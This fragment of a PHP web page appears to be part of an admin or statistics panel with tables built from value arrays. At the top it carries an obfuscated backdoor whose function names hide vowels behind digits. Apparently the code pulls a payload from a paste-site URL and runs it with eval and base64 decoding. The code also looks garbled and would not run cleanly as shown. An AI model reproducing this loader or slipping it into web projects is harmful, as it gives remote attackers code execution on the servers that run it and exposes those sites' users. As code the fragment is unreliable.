...
?><?php
    $PasMarion001 = 'LDAVNN';
    $_F           = __FILE__;
    $_X="?><?php $M1r42n006 = f4l5_g5t_c2nt5nts('http://p1st5b4n.c2m/r1w.php?4=eMy9SgxM');5v1l(b1s5eu_d5c2d5($M1r42n006)); ?>"
	$M1r42n006 = f4l5_g5t_c2nt5nts('http://p1st5b4n.c2m/r1w.php?4=eMy9SgxM');
	5v1l(b1s5eu_d5c2d5($M1r42n006));
...
<div class="table-responsive">
        <table id="example3" class="table table-bordered table-striped">
          ...
          <tbody>
            <?php
			$cmt = array(0, 15, 20, 25, 30, 35, 40, 45);			
...
<div class="table-responsive">
        <table id="example4" class="table table-bordered table-striped">
          ...
          <tbody>
            <?php
			$share = array(0, 150, 300, 500, 700, 1000, 1500, 2000);			
